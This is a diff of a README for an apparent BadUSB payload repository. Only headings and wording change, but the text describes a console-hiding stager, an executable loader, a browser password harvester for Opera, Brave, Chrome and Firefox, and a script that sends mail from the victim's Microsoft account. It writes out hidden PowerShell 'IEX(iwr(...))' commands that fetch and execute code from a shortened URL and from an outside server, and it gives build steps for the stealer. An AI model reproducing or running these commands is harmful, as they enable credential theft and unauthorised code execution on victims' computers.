@@ -19,7 +19,7 @@
 </picture>
 
 > **Note** \
-> all code target and have been tested for Windows
+> all code targets and has been tested for Windows
 
 ## URL shortener
 Shortens an url with only "safe" characters for the domain [is.gd](https://is.gd)
@@ -64,7 +64,7 @@ if __name__ == "__main__":
 
 </details>
 
-# Payload 1
+## Payload 1
 Hides visible console window (if available) and downloads and executes `Payload 2`
 
 <details>
@@ -74,9 +74,9 @@ The code can be found at [github.com/kaliiiiiiiiii/vercel_utils_server/@main/app
 
 </details>
 
-# Payload 2
+## Payload 2
 
-## Rickroll (powershell)
+### Rickroll (powershell)
 - opens MS Edge on url
 - sets audio volume to max
 - user can't close it
@@ -87,7 +87,7 @@ The code can be found at [github.com/kaliiiiiiiiii/vercel_utils_server/@main/app
 
 file: [rickroll.ps1](rickroll.ps1)
 
-### usage
+#### usage
 ```shell
 powershell -w h -ep ByPass "IEX(iwr('is.gd/tuipo'))"
 ```
@@ -97,7 +97,7 @@ or
 powershell ./rickroll.ps1
 ```
 
-### configuration
+#### configuration
 You can change the `url` and `timeout` at [L96-L98](rickroll.ps1#L96-L98)
 
 To create a short direct url to the file, run (replace `YourUserName` accordingly)
@@ -105,7 +105,7 @@ To create a short direct url to the file, run (replace `YourUserName` accordingl
 python urlshortener.py "https://raw.githubusercontent.com/YourUserName/PublicDuckyChallenger/master/rickroll.ps1"
 ```
 
-### Troubleshooting
+#### Troubleshooting
 If for some reason, you can't see your desktop anymore, perform the following steps:
 1. press `CTRL` + `SHIFT` + `ESC`
 2. click on `File`-> `Run New Task` in the Task-Manager
@@ -113,7 +113,7 @@ If for some reason, you can't see your desktop anymore, perform the following st
 4. 
 </details>
 
-## executable loader
+### executable loader
 
 downloads and executes a `.exe` file from `Endpoint 3` 
 
@@ -125,9 +125,9 @@ The code can be found at [github.com/kaliiiiiiiiii/vercel_utils_server/@main/app
 </details>
 
 
-# Payload 3
+## Payload 3
 
-## Password harvester
+### Password harvester
 Steal all available passwords from Opera, Brave, Chrome and Firefox
 
 <details>
@@ -160,7 +160,7 @@ if __name__ == "__main__":
 
 </details>
 
-## Edge email
+### Edge email
 Sends an E-Mail over the microsoft account on the device
 
 <details>
@@ -175,12 +175,12 @@ This works
 because Microsoft apparently decided
 to automatically log in with the microsoft account when creating a new MS-Edge profile
 
-### requirements
+#### requirements
 ```shell
 pip install --upgrade selenium-driverless
 ```
 
-### Usage
+#### Usage
 ```shell
  python edge_email.py "test@test.com" "Test", "Hello there!"
 ```
@@ -217,6 +217,9 @@ if __name__ == "__main__":
 
 
 # Build executables
+
+<details>
+<summary>Instructions</summary>
 
 ### Requirements
 ```shell
@@ -255,7 +258,7 @@ python steal.py -h
 #   --cc CC
 ```
 
-### Write Mail
+### Build write Mail
 set up is similar to the other build
 ```shell
 powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
@@ -267,3 +270,5 @@ Inspiration, code snippets, etc.
 [neonfury/extract.py (gist)](https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py) | password extractor for Chromium based browsers \
 [foxtonforensics.com/blog/post/analysing-chrome-login-data](https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data) \
 [unode/firefox_decrypt/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/2a163faf6c22f62eb0b061fa3c0b317ae2e4a343/firefox_decrypt.py) | password extractor for firefox
+
+</details>
